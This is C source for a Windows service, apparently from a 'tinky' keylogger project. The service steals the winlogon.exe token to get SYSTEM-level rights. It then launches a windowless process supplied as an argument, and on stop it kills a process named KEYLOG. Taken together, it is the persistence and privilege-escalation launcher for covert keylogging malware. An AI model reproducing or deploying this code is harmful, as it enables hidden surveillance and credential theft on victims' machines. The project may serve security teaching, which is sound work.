#include "tinky.h"

SERVICE_STATUS			gSvcStatus;
SERVICE_STATUS_HANDLE	gSvcStatusHandle;
HANDLE					ghSvcStopEvent = NULL;

int		ReportSvcStatus(DWORD dwCurrentState)
{
	static DWORD dwCheckPoint = 1;

	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = 0;
	gSvcStatus.dwControlsAccepted = 0;
	gSvcStatus.dwServiceSpecificExitCode = 0;
	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else
		gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

	if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else
		gSvcStatus.dwCheckPoint = dwCheckPoint++;

	return SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
{
	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP:
		ReportSvcStatus(SERVICE_STOP_PENDING);
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, findProcessByName(KEYLOG));
		if (hProcess) {
			TerminateProcess(hProcess, 9);
			SetEvent(ghSvcStopEvent);
			CloseHandle(hProcess);
			ReportSvcStatus(SERVICE_STOPPED);
		}
		return;
	default:
		break;
	}
}

VOID WINAPI	SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	HANDLE tok = 0, dtok = 0;
	STARTUPINFO startupInfo = {0};
	PROCESS_INFORMATION processInformation = {0};

	(void)dwArgc;
	gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);
	if (!gSvcStatusHandle)
		return;
	ReportSvcStatus(SERVICE_START_PENDING);
	ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!ghSvcStopEvent)
		return;
	ReportSvcStatus(SERVICE_RUNNING);
	tok = getTokenProcess("winlogon.exe");
	DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, &dtok);
	startupInfo.cb = sizeof(startupInfo);

	CreateProcessAsUser(dtok, 0, lpszArgv[1], 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &startupInfo, &processInformation);
	WaitForSingleObject(processInformation.hProcess, INFINITE);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	CloseHandle(tok);
	CloseHandle(dtok);
}

int		confService(void)
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain },
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher(DispatchTable))
		return -1;
	return 0;
}